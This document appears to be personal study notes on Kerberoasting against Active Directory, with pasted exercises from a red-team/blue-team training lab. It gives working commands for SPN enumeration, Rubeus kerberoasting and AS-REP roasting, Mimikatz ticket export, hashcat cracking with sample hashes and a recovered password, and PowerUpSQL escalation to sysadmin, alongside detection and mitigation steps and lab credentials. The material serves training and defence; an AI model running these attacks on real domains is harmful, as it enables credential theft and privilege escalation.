
To see : [[SPN - Service principal name]]

Sources : 
https://en.hackndo.com/kerberoasting/
https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast


TGS request can be made by specifying arbitrary SPN. If those [SPN](https://en.hackndo.com/service-principal-name-spn) are registered in the Active Directory, the domain controller will provide a piece of information **encrypted with the secret key of the account executing the service**. With this information, the attacker can now try to recover the account’s plaintext password via a brute-force attack.

Most of the accounts that runs services are machine accounts (`MACHINENAME$`) and their password are very long, complex and completely random, so they’re not really vulnerable to this type of attack. However, there are some services executed by accounts whose password have been chosen by a humans. It is those accounts that are much simpler to compromise via brute-force attack, so it is those accounts which will be targeted by a **Kerberoast** attack.

PowerShell script allowing you to retrieve users with at least one [SPN](https://en.hackndo.com/service-principal-name-spn) : 
```powershell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
	$userEntry = $result.GetDirectoryEntry()
	Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"
	Write-host "SPNs"        
	foreach($SPN in $userEntry.servicePrincipalName)
	{
		$SPN       
	}
	Write-host ""
}
```

Tools : 
-  [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) : 
```
Invoke-Kerberoast -domain adsec.local | Export-CSV -NoTypeInformation output.csv
john --session=Kerberoasting output.csv
```

 -  [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) provided by Impacket


# Steps 

### - Enumerates SPN

```powershell
#Build LDAP filter to look for users with SPN values registered for current domain
$ldapFilter = "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))"
$domain = New-Object System.DirectoryServices.DirectoryEntry
$search = New-Object System.DirectoryServices.DirectorySearcher
$search.SearchRoot = $domain
$search.PageSize = 1000
$search.Filter = $ldapFilter
$search.SearchScope = "Subtree"
#Execute Search
$results = $search.FindAll()
#Display SPN values from the returned objects
$Results = foreach ($result in $results)
{
	$result_entry = $result.GetDirectoryEntry()
 
	$result_entry | Select-Object @{
		Name = "Username";  Expression = { $_.sAMAccountName }
	}, @{
		Name = "SPN"; Expression = { $_.servicePrincipalName | Select-Object -First 1 }
	}
}
 
$Results
```

Results: 

```powershell
Username        SPN
--------        ---
ServiceAccount1 http/webserver1
ServiceAccount2 cifs/appserver2
```


### -  Request TGS tickets and extract password hash

#### With Rubeus : https://github.com/GhostPack/Rubeus

```powershell
PS> .\Rubeus.exe kerberoast /simple /outfile:hashes.txt
 
[*] Action: Kerberoasting
 
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
 
[*] Searching the current domain for Kerberoastable users
 
[*] Total kerberoastable users : 2
 
[*] Hash written to C:\Tools\hashes.txt
 
[*] Roasted hashes written to : C:\Tools\hashes.txt
 
PS> Get-Content .\hashes.txt
 
$krb5tgs$23$*ServiceAccount1$domain.com$http/webserver1*$45FAD4676AECDDE4C1397BFCED441F79$DEB234D8A44B2ACD16F31F3ED42B54226E2D72890870966AB5158FFC5B2EC2B4A5D956BDB157A725E6E3A4A800F626D17BB3B6FE62CDF2BAD53EA337A5E8CC6627B8CB6A32B18B914B48D95C6544C9F57C83BEF4726224507002367AA868C76854138E6A7419376343DD5131614C7B97EBC73087312EBA06FF4B067DD261AECADDDB3118C4BDDCC662AAC91C0BEBA082197D4A48E172DBE5F5A4B5DB94B1FF6EED0968243010241B7F1588E2924E631C36915E055E1A364727B79F171F2A5150E544334F5F8D1A7980645F04F4794F2EF5FECA23A9D7EEB5A38490E1A56BAB4C17A6F7B009121E405C41A22B11F4980760A3F1D2D80B52FCD3C1CF60B09C54C77BF7D08BFCF40D90498600958D56BA704EAA2101A17AA5A2A1CCA8A90752C68A1E427757A10603DC8EA62CC03196595BEC2667DA096ECDB8E5F0D11963FD52558E06F3489378B596E26F638DBB738AA214F7282B1970023D7995597651B5BB7FDCF414C53BDF791C569EB8E45B6BE36F49E87080177211ADC3D4F53F0D109A9718497E18E85FDD5C3AD376AFD95372674C318C9E690BC8A6C75DD888BCC8129F15EE7D1C625951C979B97E21538619ABA93D9DD5E32D7549A2ED3406E42F21BD9535759B92F48BC767FC1A327E0F3CAC7ACCE2AB577E2E4103F6F8DE737AB80E1A177F50B6405B05EFD5004006F99548725D785E95498DCBE85F1B6409FE2F43FE0AF185CF8E4AE3E8E581B26FC0C485380BE8811347492004BC9C733EDCA31E538796AC0F908F5487A83478D271A6ADEBF4B816207E745E84B9009F4ACC77872DF0F3D9CE327DB25AA3408823CC5F139E7D12C115BDB487E4D531CE7374E1C90ED9F732E4EA04FF0EB4B84F323A98B95951AE2AAA98735522BC51596F17B5050B4F74045195C6FDC748E1EA4BE35C4DE8253077CA1F659BECC45E87663965073A5EE8D86B042A37ACC16EF64014D7E0DC8CC505CA7F8727F00D0D046805B9F8D5BCC6FF5368B5D6758F4F1A33F26C3C3D91C2359256B19292E02536153062DC3E7FC153AD6607D695BCB0DF66A88653E495C17FD2EB091274947AB4F31C8B756FFC9F40EBF0B661E54C31ABC1E5BE66E6C37807CE17BB1AA4E2ED5D4DE70E90DF602542BFD0A1A4B149F060496F09F0E03E1814A3AAE19A23195859F82C778324FE491024FF63BBB919F958447936B1DACD294B122EE0E85C2374C1192555C0C1CD66D877AF1A77826BE42017B75A5441822E9DAAD7C02366DD5907DD1517A4AEFBAB8F8ECCD1AE1910AB17E40E1E87E288250EE468F0D0AC81C36ACC9AF3524DBEA9DDFB8C08DF0872F4C01574798F28E8017AC5799D9773BDE87A2D6682F9C76493BD738E177E68F20D4310B5AA09D4672BC6C5B0FFB60F5F2A178D7C0EF8477E9B4F9194C5AB350DFA9568C5448BDB85C09A1E623DD683FBFE817004A6C188DE29699A4F85DE3D6075E7022B6CE9E744E518AA4CCB56F876047E4E07A94F99BC8AF68BD9E0FD256EBAD615BB8B4DFB89CFC7E5D2E2D71F07D9F67DDCFE72AD7B24EFD29EF5FF90A21E970011C11CDBC5D754382D359B775CFAD7FAD5FFB35FFB38EB4A1DEF06B331EF549478E7A227C39E49ED82C737EC4A23A4073AD816C2243BD88A7F5983B3
# ... output truncated ... #
```

or 
```powershell
.\Rubeus.exe kerberoast /outfile:svc-sql.ticket 
```

>This will request for a ticket for all enabled user accounts with a servicePrincipalName. Here svc-sql.

```powershell
.\Rubeus.exe asproast /enc:RC4 /outfile:users.tgt
```

> This will request a TGT (encrypted with RC4-HMAC) for all enabled user accounts with the flag "Kerberos pre-authentication not required".

or

```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder
```

### - Crack the password offline

```powershell
PS> .\hashcat.exe -m 13100 -o cracked.txt -a 0 .\Hash.txt .\wordlist.txt
...
 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*USER$DOMAIN$http/webserver1*$e556af133...b80b25
Time.Started.....: Thu Jul 23 18:58:36 2020 (0 secs)
Time.Estimated...: Thu Jul 23 18:58:36 2020 (0 secs)
Guess.Base.......: File (.\wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    97694 H/s (0.26ms) @ Accel:256 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 100/100 (100.00%)
Rejected.........: 0/100 (0.00%)
Restore.Point....: 0/100 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> taylor
Hardware.Mon.#1..: Temp: 47c Fan: 34% Util: 32% Core:1265MHz Mem:2504MHz Bus:16
 
PS> Get-Content .\cracked.txt
$krb5tgs$23$*USER$DOMAIN$http/webserver1*$e556af133a0ca7f310381a7294099034$53db15e3d6211b716229530340031738ba46384e304de689a9303c218c1a2199e398df6fced43647c8f0e0cbf805b277ce78c70b0af34edc9c8ca15fa488cbe455771be3c0fd1cae22322ba60bed2aa4a033a7d9d40b2d61c65f10648f061c0d77d42870e6841635b3afe90df0cfc644f0797188c5bf5486e4529af8aff7f0e9e792b550623c1054250496272673d875eb6ede6f6f3e360ee0d9f173073c92ea7b2ec39a1012bd7c24e861eec4cc29c7b67ed8969f981559f19532ca8beb4edbbd4c5edc7c405158a04974bd767490b4a5895db36fa85fa24bf89cd9b4927b4b07e19516a2e6beb18aa71e5a04b2f157e1c24e26102d1855f76c2f17c9c79264774d3a67e1dd859d190e59ea29f3b82605c599160f3d5dd3830485675329e5e6ddf4b4f5ecba7e101256e1bf15b85f2f294ef90eb7bd8849f51fd120c33682006e75c87f1e04b42f79bc702a8879f4513f38dcf0ba209ebddeebaac06e751c578b02144f670408d3c66720c3312524e44d46ff7ad127cb96acc03afadee97d8a4f5fc15139998025a314559a160b274d373e9d08554e5a49397d0ae048a0437144956e3e6e50efee9b3ac2e4aeb779a4e4419571076400d716bd09d81eca1bcf392ab8f7d5cec47b44ab6be64d389fe45f1511fdef7d89baa4dc5eac18947b2dcc9458a6a8c02b4ea3e5a4309c5dec905638e32ee77158f861564660f6568455834c0622a8cb2db482603bc31501f1c7eb0c9e3c96dcd09ca055bd8f255436330d7ad6b433c6a4faee5c18d1e5ba13ca1225a9b6d71334c1b2d2482f207bdfb73373de8c48dedf68d8b7e5f042f139ba808a186d09d7f7283d25ab59f9255060e49db4f1a0358e15ea0448399b28b2c58758a968a825565b6b9cd362aba4f6dba7a882b14e983e55ba244eb4ca7496e74f8fe9a53485cde9309686120d5e9ec1d1d1b77e4d99f6334c4a674927e1b6b5086d7069f2119b1f63398deba1ae209d83135b2f5bdf094bea2990243eb96c360b272fd0738dcdc94cbc854f7543bbad5cc0d9344e2ccf7a269cf0fad223f6a60fe31d4abbde5710ce6f1b77ff510492781699631369dfdef853045131eaa711b4d02fa1f4f3a8f7e2dfb1b8752ba1e57bf63aac36d1e37c34aa4ed9446e206729f803b45fbc38452adec2989d383172b0b7948d2ab26c24d8aeb7175dc4f133999c4206564a833c49c288039faa0c1899bfd0a5331da87b5612397ee283bd70b2c77156c54f4c96b08ec7b2e7d93b80eed44102e467d26dcfe8433d3afdbe5c04768913f503aaf3f410c8c0abb415d9f5c4f3fd276e23bb7637970983fa0cc85c6b7fd54fb8c715c94e51573eb469a781125c30735e0cc996069a4c708a458952cabf0030614f32f5a0555de2302a20dd864df969ef534b2de1608d9675581ea4c590973f0c9c84ca56e2a34c3427a08ee06827133b75a97a03ec0b5a0ed814a9bd897732dc10e15c3dcf16d67d7790449df40e8b35dee6f40008029d9bc4adbe073755a9429684631c7c790b0855187cfc16cf358a8099ffaceb4836ed1b026756c21d93da72b4aeaf62ff7ce20caf30451416aef2e68812ac1888c02f62d6c5f3500d92119eddc0d01d2548af55cbb5af3fc52adbb80b25:P@ssword!23
 
# ServiceAccount1 has a password of: P@ssword!23
```

.\hashcat32.exe -a 0 -m 13100 C:\Tools\Ghostpack\svc-sql.ticket passwords.lst -o svc-sql.txt -O

- **-a 0** is for dictionary attack, on our case the dictionary is the file **passwords.lst**
- **-m 13100** is to tell hashcat that we are doing a TGS Kerberos ticket, in our case saved in this location **C:\Tools\Ghostpack\svc-sql.ticket**
- **-o svc-sql.txt** will save the result with the actual password in a local txt file
- **-O** is to run hashcat is optimized kernel mode as we don't have a lot of resources on our virtual machine

### - Use priviledge to further obj

```powershell
PS> runas /netonly /User:ServiceAccount1 powershell.exe
Enter the password for ServiceAccount1: P@ssword!23
 
PS> Import-Module .\PowerUPSQL
PS> $SQLServers = Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-object { $_.Status -eq "Accessible" }
PS> $SQLServers | Get-SQLServerInfo | Select-Object Instance, IsSysadmin -Unique
 
Instance        IsSysadmin
--------        ----------
SQLServer1      No
 
PS> Invoke-SQLEscalatePriv -Instance SQLServer1 -Verbose
VERBOSE: SQLServer1 : Checking if you're already a sysadmin...
VERBOSE: SQLServer1 : You're not a sysadmin, attempting to change that...
# ... output truncated ... #
VERBOSE: SQLServer1 : Success! You are now a Sysadmin!
 
PS> $SQLServers | Get-SQLServerInfo | Select-Object Instance, IsSysadmin -Unique
 
Instance        IsSysadmin
--------        ----------
SQLServer1      Yes
```

Ccl : 
Use for lateral movement

## Mitigation 

-  Security Event ID 4769 – A Kerberos ticket was requested
	-  Service name should not be krbtgt
	- Service name does not end with $ (to filter out machine accounts used for services)
	- Account name should not be machine@domain (to filter out requests from machines)
	- Failure code is '0x0' (to filter out failures, 0x0 is success)
	- Most importantly, ticket encryption type is 0x17
- Service Account Passwords should be hard to guess (greater than 25 characters)
- Use Managed Service Accounts (Automatic change of password periodically and delegated SPN Management)
- Ensure the conditions for AES256 are met
- Use long and complex passwords for service accounts or gMSA

#### Enumerate accounts with DONT_REQ_PREAUTH
(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556. 1.4.803:=4194304))

#### LDAP query to search for user with SPN
(&(objectCategory=person)(servicePrincipalName=*))



(ING) LAB 3 - The compromise of credentials

3 Hr 59 Min Remaining

Instructions Resources Help  100%

## Exercise 5 - Roast Kerberos service tickets [optional]

Well well **Miss Red** your last attacks left quite the traces in the logs. Let's try to be more discreet this time. Let's attack a user's password without making a million entry in the logs. It is time for you to switch gear and use Kerberos roasting attacks.

### Task 1 - Detect potential Kerberos roastable users

For this, you can use BloodHound as it pre-chewed the recon for you.

1. Log back on **[CLI01](https://labclient.labondemand.com/Instructions/408ee615-f168-4d09-8db9-7640eef31f16?rc=10#)** using the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. Open a new **File Explorer** window and navigate to `C:\Tools\BloodHound`.
    
3. Double click on **BloodHound.exe** and log in with these credentials:
    
    |||
    |---|---|
    |Neo4j Username|`neo4j`|
    |Neo4j Password|`NeverTrustAny1!`|
    
4. Click on the burger menu on the top left ![BHBURGER.png](https://labondemand.blob.core.windows.net/content/lab127270/BHBURGER.png) and then click on the **Analysis** tab. In the **Kerberos Interaction** section, click on **List all Kerberoastable Accounts**. Then search the account **SVC-SQL@CONTOSO.COM** in the graph.
    
5. Once located, click on **SVC-SQL@CONTOSO.COM**. The menu of the left will switch to the **Node Info** tab. Scroll down and look at the information in the **NODE PROPERTIES** section.
    
    📝 When was the password last set?
    
    📝 When does the password expire?
    
    This looks like a prime target for Kerberos roasting 🍗
    

### Task 2 - Rquest for a ticket and save it on the disk

1. You are still on **[CLI01](https://labclient.labondemand.com/Instructions/408ee615-f168-4d09-8db9-7640eef31f16?rc=10#)**. If you don't have a **Windows Terminal** already open, then right click on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127270/11menu.png) and click on **Windows Terminal (Admin)**.
    
2. Change the current directory by typing `cd \Tools\Ghostpack` and hit **Enter**.
    
3. Execute the following command `.\Rubeus.exe kerberoast /outfile:svc-sql.ticket`.
    
    > This will request for a ticket for all enabled user accounts with a servicePrincipalName. In our case, it will only be **svc-sql**.
    

At this point we have the ticket saved locally **C:\Tools\Ghostpack\svc-sql.ticket**. Now we need to roast it 🔥

### Task 3 - Roast the ticket

In our case we will perform a dictionary attack against the ticket. We don't have the performance in our lab to use GPU and try a full-on rainbow attack on the ticket.

1. You are still on **[CLI01](https://labclient.labondemand.com/Instructions/408ee615-f168-4d09-8db9-7640eef31f16?rc=10#)**. If you don't have a **Windows Terminal** already open, then right click on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127270/11menu.png) and click on **Windows Terminal (Admin)**.
    
2. Change the current directory by typing `cd \Tools\hashcat` and hit **Enter**.
    
3. Execute the following command `.\hashcat32.exe -a 0 -m 13100 C:\Tools\Ghostpack\svc-sql.ticket passwords.lst -o svc-sql.txt -O` Here are some details about the parameters:
    
    - **-a 0** is for dictionary attack, on our case the dictionary is the file **passwords.lst**
    - **-m 13100** is to tell hashcat that we are doing a TGS Kerberos ticket, in our case saved in this location **C:\Tools\Ghostpack\svc-sql.ticket**
    - **-o svc-sql.txt** will save the result with the actual password in a local txt file
    - **-O** is to run hashcat is optimized kernel mode as we don't have a lot of resources on our virtual machine
    
    ![HASHCATOUTPUT.png](https://labondemand.blob.core.windows.net/content/lab127270/HASHCATOUTPUT.png)
    
4. Open a **File Explorer** window and navigate to `C:\Tools\hashcat` and open the file **svc-sql.txt** with **Notepad**.
    
5. On the **Notepad** window, click **View** and check **Word wrap**. You should see the password at the very end of the file.
    
    📝 What the password for the **svc-sql** account?
    
6. At this point it is possible that the **Windows Terminal** console is hanging. Close the window.
    

Time to bring the news to **Mister Blue**.

0% Tasks Complete

PreviousNext: Exercise 6 - Detect...

Live Chat


(ING) LAB 3 - The compromise of credentials

3 Hr 59 Min Remaining

Instructions Resources Help  100%

## Exercise 6 - Detect Kerberos roasting [optional]

**Miss Red** came up strong this time… She found the password of a service account which is also a privileged account. Let see if we could have avoided it…

### Task 1 - Check the logs on your domain controller

Welcome back **Mister Blue**, let's dig into our DC logs.

1. Connect back to **[DC01](https://labclient.labondemand.com/Instructions/408ee615-f168-4d09-8db9-7640eef31f16?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
2. If the **Event Viewer** is not already open, right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127270/2022menu.png) and click on **Event Viewer**. Then navigate to **Event Viewer (Local)** > **Windows Logs** > **Security**.
    
3. On the **Actions** pane, click on **Filter Current Log…** and where you see type `4769` and click **OK**.
    
    📝 What is the **Task Category** of the event **4769**?
    
4. On the **Actions** pane, click on **Find…**, in the **Find** window type `svc-sql` and click **Find Next**.
    
5. Here is the only trace that this attack left on the environment. And as you can see, it is not even a failed logon or anything super suspicious: ![4769.png](https://labondemand.blob.core.windows.net/content/lab127270/4769.png)
    
    > The event **4769** is generated when a failed authentication takes place on the sytem. It tells you information about:
    > 
    > - The account for tp whom the ticket was issued, here **red@CONTOSO.COM**
    > - The account for which the ticket was issued, here **svc-sql**, note that we do not see the servicePrincipalName
    > - The source IP of the authentication attempt
    > - The encryption type used for the ticket, here **0x17** means **RC4-HMAC**
    > - The error code if the ticket issuance failed, here it is **0x0** because it was a success All the information about the event 4769 can be found in the 🔗 [security event documentation](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769).
    
    [more...](https://labclient.labondemand.com/Instructions/408ee615-f168-4d09-8db9-7640eef31f16?rc=10#)
    
    📝 What is the **Ticket Encryption Type** in plain text?
    

### Task 2 - Identify ideal target for roasting

You do not need to wait for **Miss Red** report. You can identify yummy kerberos roasting targets with a simple LDAP filter:

1. You are still connected on **[DC01](https://labclient.labondemand.com/Instructions/408ee615-f168-4d09-8db9-7640eef31f16?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127270/2022menu.png) and click on **run**.
    
3. In the **Run** window, type `dsac.exe` and click **Run**.
    
4. In the **Active Directory Administrative Center** window, click on **Global Search** in the left.
    
5. In the **GLOBAL SEARCH** section, click on **Convert to LDAP** and type the following in the text area `(&(objectCategory=person)(servicePrincipalName=*))` and click **Apply**. You can disregard the **krbtgt** account. You san see that you also found the **svc-sql**.
    
    > You could refine the filter to include only **enabled** accounts for which the **password never expired** as they are definitely the best targets.
    

### Task 3 - Enable AES256 encryption type

Changing the encryption type doesn't make the account uncrackable using Kerberos Roasting tools and techniques. But it makes things slightly more complicated as:

- AES256 hash are salted, so users with the same password will not have the same AES256 hash. This forces an attacker to calibrate a rainbow attack specifically for that ticket and is time consuming.
- it also gives you a detection opportunity as attackers might explicitly ask for lower encryption and make it easier for you to spot suspicious ticket issuance in the logs

1. You are still connected on **[DC01](https://labclient.labondemand.com/Instructions/408ee615-f168-4d09-8db9-7640eef31f16?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
2. You should still have the **Active Directory Administrative Center** open in the search result page, double click on the **svc-sql** user.
    
3. In the **svc-sql** window, expand the **Encryption options** on the right side. Select **Other encryption options**, tick the checkbox **This account supports Kerberos AES256 bit encryption** and click **OK**.
    
    > Tickets for this account should now be using AES256. Note that if that ticket needs to be used on system which do not support AES256 for Kerberos encryption, this might break workload. Always make sure your systems are up-to-date and support the latest encryption.
    
    Note that the AES keys for this account might not exist. If the account is old and the password was changed at a time AES256 was not supported by domain controllers (like the Windows Server 2003 era) the DCs will still issue RC4-HMAC ticket for the account until the password has be reset twice.
    
    **Assumed breach!** If you find an ideal account for roasting because the password has not changed in a long time and AES256 was never enabled, just pretend the account is already compromised. Enable AES256 and change the password twice in a row. Or event better… Replace the account with a gMSA account!
    
    🔗 [Group Managed Service Accounts Overview](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
    

0% Tasks Complete

PreviousNext: Exercise 7 - Roast...

Alert

**Connection Issues?**

The connection to your lab machines appears to have been interrupted.

Live Chat


(ING) LAB 3 - The compromise of credentials

3 Hr 59 Min Remaining

Instructions Resources Help  100%

## Exercise 7 - Roast Kerberos TGT [optional]

What if we could roast users even if they don't have a servicePrincipalName? Well, no problem! If an admin has disabled Kerberos pre-authentication on a user account (they sometimes do it by mistake during troubleshooting and forget to add it back), then we can ask for a TGT for that account and try to roast it.

### Task 1 - Identify accounts without Kerberos pre-authentication

1. Log back on **[CLI01](https://labclient.labondemand.com/Instructions/408ee615-f168-4d09-8db9-7640eef31f16?rc=10#)** using the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. right click on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127270/11menu.png) and click on **Windows Terminal (Admin)**.
    
3. In the **Windows Terminal** window, change the current directory by typing `cd \Tools\Ghostpack` and hit **Enter**.
    
4. Execute the following command `.\Rubeus.exe asproast /enc:RC4 /outfile:users.tgt`.
    
    > This will request a TGT (encrypted with RC4-HMAC) for all enabled user accounts with the flag "Kerberos pre-authentication not required".
    

At this point we have the TGT of **Connie.Flores** saved locally **C:\Tools\Ghostpack\users.tgt**. Now you just need to roast it using your favorit tool.

### Task 2 - Enable Kerberos pre-authentication

Hello again **Mister Blue**! Words on the street are that **Miss Red** was able to crack a TGT… Well, probably due to the misconfiguration of some accounts in your domain. Let's identify which one and correct it.

1. Go back on **[DC01](https://labclient.labondemand.com/Instructions/408ee615-f168-4d09-8db9-7640eef31f16?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\blue`|
    |Password|`NeverTrustAny1!`|
    
2. You should still have the **Active Directory Administrative Center**. Click on **Global Search** in the left.
    
3. In the **GLOBAL SEARCH** section, click on **Convert to LDAP** and type the following in the text area `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))` and click **Apply**.
    
    > The **userAccountControl** attribute is well documented here: 🔗 [Use the UserAccountControl flags to manipulate user account properties](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)
    
    📝 What is the default userAccountControl value for a regular user account?
    
    📝 What is the userAccountControl flag for a disabled account?
    
4. Double click on **Connie Flores** account. In the **Account** section, expand **Other options** and uncheck **Do not require Kerberos pre-authentication**.
    
    This is the option on a user account's properties page in the **dsa.msc** console: ![CONNIE1.png](https://labondemand.blob.core.windows.net/content/lab127270/CONNIE1.png)
    
    Ideally you will need to reset the password twice in a row… Again that's the assumed breach mindset.
    

0% Tasks Complete

PreviousNext: Exercise 8 -...

Live Chat